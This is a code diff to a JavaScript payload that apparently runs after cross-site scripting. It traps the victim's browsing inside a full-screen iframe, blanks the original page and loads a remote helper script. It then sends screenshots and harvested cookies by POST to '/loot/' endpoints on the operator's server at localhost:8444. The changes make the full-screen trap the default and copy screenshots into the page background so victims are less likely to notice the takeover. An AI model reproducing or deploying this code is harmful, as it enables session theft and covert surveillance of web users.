@@ -8,8 +8,14 @@
 // page in the background so you can 
 // tell if you're still where you need to be during
 // development. 
-let fullscreenIframe = false; // Set to true for production use, false for dev
+let fullscreenIframe = true; // Set to true for production use, false for dev
 
+// Whether or not to copy screenshots to background
+// Can make transitions smoother. Sometimes the
+// background page of the iFrame trap flashes through
+// when navigating the app. This hides that a bit
+// by copying the image to the background
+let setBackgroundImage = true;
 
 // What page in the application to start users in
 // Note that if the trap is loading from
@@ -158,12 +164,20 @@ function sendScreenshot()
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
 		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
 
+
+		if (setBackgroundImage)
+		{
+			// Helps hide flashing of the page when clicking around
+			//console.log("+++ Setting background image...");
+			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
+			document.body.style.backgroundRepeat = "no-repeat";
+			document.body.style.backgroundSize = "auto";
+		}
+
+
 		canvas.toBlob((blob) => 
 		{
 			const image = blob;
-					// jsonData["screenshot"] = image;
-					// var jsonString = JSON.stringify(jsonData);
-
 			request.send(image);
 		});
 	}).catch(e => console.log(e));
@@ -251,7 +265,7 @@ function checkCookies()
 			cookieStorageDict[cookieName] = cookieValue;
 		}
 
-pink		// Ship it
+		// Ship it
 		request = new XMLHttpRequest();
 		request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
@@ -384,7 +398,7 @@ function takeOver()
 {
 
 	//document.body.style.backgroundColor = "pink";
-	document.innerHTML = "";
+	//document.innerHTML = "";
 
 	// Setup our iframe trap
 	var iframe = document.createElement("iframe");
@@ -435,6 +449,10 @@ js.type = "text/javascript";
 js.src = "http://localhost:8444/lib/telemhelperlib.js";
 document.body.appendChild(js);
 
+// Blank the page so it doesn't show through as users 
+// navigate inside the iframe
+document.body.innerHTML = "";
+document.body.outerHTML = "";
 
 // Pick our session ID
 initSession();
